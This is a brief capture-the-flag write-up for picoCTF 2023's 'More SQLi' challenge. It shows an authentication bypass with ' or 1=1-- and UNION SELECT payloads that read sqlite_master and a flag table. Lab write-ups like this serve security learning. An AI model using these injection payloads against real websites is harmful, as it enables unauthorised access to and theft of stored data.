# More SQLi #
## Overview ##
200 points

picoCTF 2023
## Description ##
Can you find the flag on this website.
Try to find the flag here.
## Solution ##
First, we get a login screen:

<img width="372" alt="image" src="https://github.com/xoxo-ily/ctfWriteups/assets/68173773/940a7850-7da1-40bf-a124-2fa6b8fe44f1">
<br><br>

We can get past this by entering anything in the username field and `' or 1=1--` in the password field. 

Then we get a table:

<img width="597" alt="image" src="https://github.com/xoxo-ily/ctfWriteups/assets/68173773/c3170b10-6e32-4281-91c5-c44722585819">
<br><br>

To get all table and column names, enter `' UNION SELECT tbl_name,sql,'' FROM sqlite_master--`:

<img width="583" alt="image" src="https://github.com/xoxo-ily/ctfWriteups/assets/68173773/ab23c4a5-1e7d-4d2f-a1e6-1871eee781a2">
<br><br>

We see that "flag" is in `more_table`, so we search again with `' UNION SELECT flag,'','' FROM more_table--` to get the flag:

<img width="588" alt="image" src="https://github.com/xoxo-ily/ctfWriteups/assets/68173773/ced4f9db-e328-4283-95f6-b5c46833611d">


## Resources used ##
[cool website](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf) 
